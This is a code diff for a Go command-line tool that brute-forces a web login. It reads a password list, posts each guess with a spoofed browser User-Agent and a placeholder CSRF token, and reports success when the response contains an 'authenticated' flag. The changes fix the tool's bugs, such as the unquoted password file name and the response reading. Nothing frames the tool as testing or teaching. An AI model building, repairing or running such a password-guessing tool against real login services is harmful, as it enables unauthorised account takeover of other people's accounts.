@@ -3,6 +3,7 @@ package main
 import (
     "bufio"
     "fmt"
+    "io"
     "net/http"
     "net/url"
     "os"
@@ -27,7 +28,7 @@ func tryPassword(username, password string) bool {
 
     req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
     req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-    req.Header.Set("X-CSRFToken", "dummy") // باید مقدار واقعی گرفته شود
+    req.Header.Set("X-CSRFToken", "dummy") // مقدار واقعی نیاز است
 
     resp, err := client.Do(req)
     if err != nil {
@@ -36,13 +37,12 @@ func tryPassword(username, password string) bool {
     }
     defer resp.Body.Close()
 
-    buf := new(strings.Builder)
-    _, err = buf.ReadFrom(resp.Body)
+    bodyBytes, err := io.ReadAll(resp.Body)
     if err != nil {
         fmt.Println("Error reading response:", err)
         return false
     }
-    body := buf.String()
+    body := string(bodyBytes)
 
     if resp.StatusCode == 200 && strings.Contains(body, `"authenticated":true`) {
         return true
@@ -55,11 +55,7 @@ func main() {
     var username string
     fmt.Scanln(&username)
 
-    fmt.Print("Enter passwords file path: ")
-    var filePath string
-    fmt.Scanln(&filePath)
-
-    file, err := os.Open(password.txt)
+    file, err := os.Open("password.txt")
     if err != nil {
         fmt.Println("Error opening passwords file:", err)
         return
